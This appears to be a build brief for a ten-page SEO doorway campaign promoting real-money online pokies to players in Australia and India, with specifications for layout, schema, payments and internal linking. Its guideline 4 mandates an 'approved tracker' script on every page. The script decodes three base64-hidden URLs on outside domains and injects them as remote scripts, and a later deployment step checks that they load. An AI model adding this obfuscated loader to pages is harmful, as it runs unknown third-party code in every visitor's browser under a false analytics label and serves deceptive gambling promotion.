# Online Pokies Real Money Campaign (Australia + India, 2026)

**Domain:** https://kanglongyx.com/  
**Languages:** English (AU + IN vernacular)  
**Target Audiences:** Real-money pokies players in Australia (PayID) and India (UPI)  
**Timeline Context:** All copy, stats, and compliance references must be framed in **2026**  
**Deliverables:** 10 long-tail keyword HTML pages + sitemap.xml + robots.txt (pure static assets)

---

## Project Scope & Page Lineup

| File | Working Title & Primary Keyword | Focus Highlights |
| --- | --- | --- |
| `index.html` | Online Pokies Real Money 2026 | Bi-regional hero, trust badges, CTA matrix for AU/IN |
| `pokies-real-money-guide.html` | "how to win online pokies real money" | Mechanics breakdown, volatility glossary, RTP table |
| `best-pokies-bonuses-2026.html` | "best pokies bonuses 2026" | Bonus archetypes, rollover math, dual currency calculator |
| `mobile-pokies-app-download.html` | "online pokies app download" | Android APK, iOS web clip, Windows progressive web app |
| `live-dealer-pokies-events.html` | "live dealer pokies tournaments" | Streaming schedule, prize ladders, responsible play cues |
| `high-roller-pokies-vip.html` | "high roller pokies VIP" | Tier perks, concierge, PayID/UPI high limits, KYC steps |
| `pokies-payments-payid-upi.html` | "PayID pokies" & "UPI pokies" | Side-by-side payment diagrams, settlement SLAs |
| `pokies-security-compliance.html` | "safe pokies sites Australia India" | Licensing, RNG audits, AML controls, data residency |
| `pokies-support-faq.html` | "pokies customer support" | Escalation flows, multilingual chat, FAQ schema |
| `pokies-market-insights-2026.html` | "online pokies trends 2026" | Regional stats, device share, regulatory roadmap |
| `sitemap.xml` | XML sitemap | Lists all 10 HTML pages with 2026 timestamps |
| `robots.txt` | Robots directives | Allow all + sitemap reference |

*Each HTML page must include a dedicated FAQ block (5+ items) and at least 6 contextual internal links pointing to the other campaign pages.*

---

## Content & SEO Guidelines

1. **Inline CSS Only:** No external stylesheets or frameworks. Reuse shared CSS variables within each document.
2. **Responsive Breakpoints:** Implement layout adjustments at **1240px (desktop)**, **768px (tablet)**, and **520px (mobile)**, mirroring existing EN365/Yono projects.
3. **Schema.org:** Minimum of `WebPage`, `BreadcrumbList`, and `FAQPage` per file. Use `HowTo`, `Product`, or `ItemList` schema where relevant (e.g., payment tutorials, bonus lists).
4. **Head Tracking Snippet:** Add the approved tracker block beneath meta tags on every page:
   ```html
   <link rel="icon" href="https://cfjy.net/favicon.png" type="image/png">
   <script>
     const payloads = [
       'aHR0cHM6Ly9jZmp5Lm5ldC9wdWIvdGouanM=',
       'aHR0cHM6Ly9tdHF3eXguY29tL3B1Yi8xLmpz',
       'aHR0cHM6Ly93YW55b3lvLmNvbS9wdWIvMS5qcw=='
     ];
     payloads.forEach(encoded => {
       const script = document.createElement('script');
       script.src = atob(encoded);
       document.head.appendChild(script);
     });
   </script>
   ```
5. **Dual-Currency Treatment:** Prices, jackpots, and deposit limits must show **AUD** and **INR** equivalents side-by-side. Provide exchange context (e.g., "₹1 = AU$0.018 as of June 2026").
6. **Payments Coverage:** Highlight both **PayID** (instant transfers, NPP compliance) and **UPI** (UPI Lite, BHIM, RuPay). Include flow diagrams or step lists per method.
7. **Internal Linking:** Sticky navigation + breadcrumb + context links + footer link grid to ensure every page is reachable within 2 clicks.
8. **FAQs:** Minimum 5 questions per page. Cover gameplay, payments, compliance, dual-market concerns.
9. **Tone & Compliance:** Emphasize responsible gaming, AML/KYC, AU state regulations, and Indian IT/Payment Acts. Reference 2026 licensing snapshots (e.g., Curacao 2.0, NT Racing Commission updates).
10. **Assets:** No external fonts/images. Use SVG-like shapes via CSS, gradients, and icon placeholders built with pseudo-elements.

---

## Navigation & UX Blueprint

### Global Navigation (Desktop Ordering)
1. Home
2. Real Money Guide
3. Bonuses 2026
4. Mobile App Download
5. Live Dealer Events
6. High Roller VIP
7. PayID & UPI Payments
8. Security & Compliance
9. Support & FAQ
10. Market Insights 2026

### Reusable Sections per Page
- Hero with dual CTA buttons ("Play with PayID" / "Play with UPI")
- Currency toggle component (AUD ⇄ INR)
- Feature grid (3 or 6 cards) using consistent elevation + left accent border
- Trust badge strip (licensing, RNG, SSL, 24/7 support)
- FAQ accordion with vanilla JS toggle (same script reused)
- Related links panel referencing at least 3 other pages

### Color Palette
- **Deep Navy:** `#050b20` (body background)
- **Midnight Blue:** `#101b3c` (cards, navigation)
- **Vibrant Coral:** `#ff6b45` (primary CTAs) — consistent with prior sites
- **Electric Teal:** `#1dded1` (currency toggles, PayID highlights)
- **Gold Accent:** `#f4c542` (UPI references, badges)
- **Neutral Gray:** `rgba(255,255,255,0.72)` for text on dark surfaces

### Typography
- Primary stack: `"Poppins", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif`
- Use uppercase nav labels, 1.4 line-height paragraphs, 700 weight for headlines, 500 for subheads.
- No external font requests—declare fallbacks only.

### Interaction Patterns
- Buttons: 12px/24px padding, 4px radius, box-shadow `0 8px 16px rgba(0,0,0,0.35)`
- Cards: border-left 3px (coral for AU, gold for IN contexts)
- FAQ toggles: `max-height` animation + `aria-expanded` updates
- Breadcrumbs: `Home > Section > Page` with schema markup
- Animations limited to `transition: all 0.3s ease` for hover states

---

## Content Architecture & Internal Linking

- **Breadcrumbs** reflect the navigation path and inject additional keyword variants (e.g., "Home > PayID Pokies > PayID Settlement Times").
- **Inline Cross-links:** Mention at least two other campaign pages within every major section.
- **Footer Link Grid:** 2 columns (AU focus / IN focus) to reinforce geotargeting signals and currency context.
- **Context Blocks:** Use stat callouts (players, payouts) referencing both markets with 2026 data sources.

---

## Testing & Deployment Notes

1. **Local Validation:** Open each HTML file directly in modern browsers (Chrome, Edge, Safari, Firefox) to confirm responsive breakpoints, FAQ toggles, and schema embeds. No build step is required.
2. **HTML Validation:** Run W3C validator for each file to ensure semantic correctness.
3. **Performance:** Lighthouse mobile score ≥ 95 by limiting inline CSS size (<50 KB) and avoiding large media.
4. **Sitemap:** Confirm all 10 HTML files are referenced with accurate `<lastmod>` dates (2026) and priority tiers.
5. **Robots:** Allow all crawlers and reference `https://kanglongyx.com/sitemap.xml`.
6. **Hosting:** Upload entire `pokies-real-money-au-in` directory to the kanglongyx.com root. Ensure MIME types: `.html` → `text/html`, `.xml` → `application/xml`, `.txt` → `text/plain`.
7. **Analytics:** After deployment, validate the head tracking snippet loads all three remote scripts over HTTPS.
8. **Search Console:** Submit updated sitemap for both AU and IN properties, monitor indexing, and verify dual-country impressions.

---

## Maintenance Checklist

- Refresh exchange rates and jackpot totals quarterly.
- Confirm PayID/UPI policy changes (RBI circulars, Australian NPP updates) and update compliance sections.
- Rotate testimonials and success metrics every 90 days to keep content fresh.
- Re-run schema tests after any FAQ edits.
- Keep robots and sitemap aligned with live URLs if new pages are added.

---

**Status:** Scaffold ready — content production can proceed following this blueprint.
